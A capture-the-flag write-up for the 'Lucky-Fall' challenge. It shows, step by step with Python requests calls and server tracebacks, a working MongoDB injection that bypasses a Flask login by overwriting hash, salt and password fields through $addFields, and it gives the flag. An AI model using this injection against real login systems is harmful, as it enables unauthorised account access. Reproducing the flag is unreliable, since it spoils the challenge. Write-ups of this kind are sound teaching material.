# Lucky-Fall

## Writeup
We are given a simple login form which accepts json with a login and a password. Given malformed it gives an error informing us that it basicly allows overwriting return fields in the query. From there just send it something with an empty 'salt' and 'password' and the 'hash' with the hash (sha256) of an empty string.

```python
In [1]: import requests

In [2]: print(requests.post('http://lucky-fall.challs.m0lecon.it/login', json = {}).text)
Traceback (most recent call last):
  File "/home/appuser/mongo_in/flask/server.py", line 38, in login
    user = users.aggregate([{"$match": {"user": request.json["name"]}}, {"$addFields": request.json}]).next()
KeyError: 'name'


In [3]: print(requests.post('http://lucky-fall.challs.m0lecon.it/login', json = {'name' : {"$ne" : ''}}).text)
Traceback (most recent call last):
  File "/home/appuser/mongo_in/flask/server.py", line 38, in login
    user = users.aggregate([{"$match": {"user": request.json["name"]}}, {"$addFields": request.json}]).next()
  File "/home/appuser/.local/lib/python3.8/site-packages/pymongo/collection.py", line 2453, in aggregate
    return self._aggregate(_CollectionAggregationCommand,
  File "/home/appuser/.local/lib/python3.8/site-packages/pymongo/collection.py", line 2375, in _aggregate
    return self.__database.client._retryable_read(
  File "/home/appuser/.local/lib/python3.8/site-packages/pymongo/mongo_client.py", line 1471, in _retryable_read
    return func(session, server, sock_info, slave_ok)
  File "/home/appuser/.local/lib/python3.8/site-packages/pymongo/aggregation.py", line 136, in get_cursor
    result = sock_info.command(
  File "/home/appuser/.local/lib/python3.8/site-packages/pymongo/pool.py", line 683, in command
    return command(self, dbname, spec, slave_ok,
  File "/home/appuser/.local/lib/python3.8/site-packages/pymongo/network.py", line 159, in command
    helpers._check_command_response(
  File "/home/appuser/.local/lib/python3.8/site-packages/pymongo/helpers.py", line 164, in _check_command_response
    raise OperationFailure(errmsg, code, response, max_wire_version)
pymongo.errors.OperationFailure: Invalid $addFields :: caused by :: Expression $ne takes exactly 2 arguments. 1 were passed in., full error: {'ok': 0.0, 'errmsg': 'Invalid $addFields :: caused by :: Expression $ne takes exactly 2 arguments. 1 were passed in.', 'code': 16020, 'codeName': 'Location16020'}


In [4]:  print(requests.post('http://lucky-fall.challs.m0lecon.it/login', json = {"name" : {"$ne" : [1, 2]}}).text)
Traceback (most recent call last):
  File "/home/appuser/mongo_in/flask/server.py", line 39, in login
    if hashlib.sha256((user["password"] + user["salt"]).encode("UTF-8")).hexdigest() == user["hash"]:
KeyError: 'password'


In [5]: import hashlib

In [6]: print(requests.post('http://lucky-fall.challs.m0lecon.it/login', json = {"name" : {"$ne" : [1,2]}, "hash" : hashlib.sha256(b"").hexdigest(), "salt" : "", "password" : ""}).text)
ptm{it_is_nice_to_have_objects_as_parameters}
```

## flag
ptm{it_is_nice_to_have_objects_as_parameters}
